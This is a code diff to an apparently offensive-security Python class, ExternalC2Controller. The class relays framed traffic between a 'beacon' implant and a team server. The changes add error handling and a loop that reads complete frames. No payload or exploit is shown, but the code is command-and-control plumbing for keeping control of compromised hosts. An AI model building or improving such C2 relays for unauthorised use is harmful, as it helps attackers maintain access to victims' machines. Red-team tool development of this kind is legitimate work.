@@ -122,7 +122,12 @@ class ExternalC2Controller:
         :param data: Data to send to beacon
         """
         frame = self.encode_frame(data)
-        self._socketBeacon.sendall(frame)
+        try:
+            self._socketBeacon.sendall(frame)
+        except Exception as e:
+            print("sendall() in sendToBeacon failed. Error: {}".format(e))
+            return -1
+        return None
 
 
     def recvFromBeacon(self, tcpinfo):
@@ -135,12 +140,25 @@ class ExternalC2Controller:
             data_length = self._socketBeacon.recv(4)
         except:
             print("Recv failed.")
-            return None
+            return -1
         if data_length == b'':
+            print("Empty data_length")
             return None
-        len = struct.unpack("<I", data_length)
+        len_tup = struct.unpack("<I", data_length)
+        length = len_tup[0]
         # Unpack returns a tuple
-        data = self._socketBeacon.recv(len[0])
+        total = 0
+        data = b''
+        while (total < length):
+            try:
+                temp = self._socketBeacon.recv(length-total)
+            except Exception as e:
+                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
+                return -1
+            total = total + len(temp)
+            data = data + temp
+        if length != len(data):
+            print("WARNING: sent len {} does not equal bytes recv'd {}.".format(length, len(data)))
         return data
 
 
@@ -181,7 +199,7 @@ class ExternalC2Controller:
 
             data = self.recvFromBeacon(tcpinfo)
             if data == None:
-                print("Disconnected from beacon")
+                print("Disconnected from beacon, likely due to sleep.")
                 self._socketBeacon, beacon_addr = self._socketServer.accept()
                 print("Connected to : {}".format(beacon_addr))
                 if current_beacon_ip == beacon_addr[0]:
@@ -189,14 +207,16 @@ class ExternalC2Controller:
                 else:
                     print("Error: new connection. Exiting..")
                     break
-            print("Received %d bytes from beacon" % len(data))
-
-            print("Sending %d bytes to TS" % len(data))
+            elif data == -1:
+                print("recvFromBeacon failed. Exiting")
+                break
+            print("Received {} bytes from beacon and sending to TS".format(len(data)))
             self.send_to_ts(data)
 
             data = self.recv_from_ts()
-            print("Received %d bytes from TS and sending to beacon" % len(data))
-            self.sendToBeacon(tcpinfo, data)
+            print("Received {} bytes from TS and sending to beacon".format(len(data)))
+            if (self.sendToBeacon(tcpinfo, data) == -1):
+                break
         self._socketBeacon.close()
         self._socketServer.close()
         self._socketTS.close()
